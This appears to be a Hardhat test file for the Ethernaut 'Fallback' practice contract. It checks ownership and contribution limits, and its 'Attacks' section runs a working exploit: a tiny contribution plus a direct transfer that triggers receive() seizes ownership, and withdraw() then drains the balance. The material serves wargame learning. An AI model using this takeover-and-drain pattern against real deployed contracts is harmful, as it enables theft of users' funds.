const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");
const utils = require("../scripts/lib/utils.js");

const provider = waffle.provider;

describe("Ethernaut Fallback", function () {		  
	let fallback;				//contracts 
	let owner, addr1, addr2;	//accounts 
	
	beforeEach(async function () {
		[owner, addr1, addr2,...addrs] = await ethers.getSigners();
        
        //deploy contract
		fallback = await utils.deployContractSilent("Fallback");
	});
	      
	describe("Initial state", function () {
		it("contract owner", async function () { 
			//'owner' should be contract owner 
            expect(await (fallback.owner())).to.equal(owner.address);
		});
		
		it("contribution amounts", async function () {
			//owner contribution is 1000 by default
            expect(await (fallback.getContribution())).to.equal(ethers.utils.parseEther('1000'));
			
			//all other addresses should have 0 contribution 
            expect(await (fallback.connect(addr1).getContribution())).to.equal(0);
            expect(await (fallback.connect(addr2).getContribution())).to.equal(0);
		});
    });    
	
	      
	describe("Contributions", function () {
		it("do not award owner status", async function () {
			//addr1 contributes 1 
			await fallback.connect(addr1).contribute({value: 1});
            expect(await (fallback.connect(addr1).getContribution())).to.equal(1);
			
			//ownership has not changed 
            expect(await (fallback.owner())).to.equal(owner.address);
		});
		
		it("cannot contribute more than max", async function () {
			//contributions over max should be reverted 
			await expect(fallback.connect(addr1).contribute(
				{value: ethers.utils.parseEther('0.0011')})
			).to.be.revertedWith("Contribution must be below min");
		});
		
		it("can contribute less than max", async function () {
			//contribute just under max 
			const amount = ethers.utils.parseEther('0.0009');
			
			//should not be reverted 
			await expect(fallback.connect(addr1).contribute(
				{value: amount})
			).to.be.not.reverted;
			
			//contribution should be correctly recorded 
			expect(await fallback.connect(addr1).getContribution()).to.be.equal(amount);
		});
    });    
	
	describe("Attacks", function () {
		it("illegally become owner", async function () {
			//originally, 'owner' is the contract owner 
			expect(await fallback.owner()).to.be.equal(owner.address);
			
			//let address 1 become the owner by 
			//  1. paying a tiny amount into the contract via contribute()
			//  2. invoking the contract's receive() function 
			await fallback.connect(addr1).contribute({value:1});
			await addr1.sendTransaction({
				to: fallback.address,
				value: 1,
			}); 
			
			//now, addr1 should be the new owner
			expect(await fallback.owner()).to.be.equal(addr1.address);
		});
		
		it("drain contract balance", async function () {
			//become owner 
			await fallback.connect(addr1).contribute({value:1});
			await addr1.sendTransaction({
				to: fallback.address,
				value: 100,
			}); 
			
			//verify balance 
			expect(await provider.getBalance(fallback.address)).to.be.equal(101);
			
			//drain balance and verify 
			await fallback.connect(addr1).withdraw();
			expect(await provider.getBalance(fallback.address)).to.be.equal(0);
		});
	});
});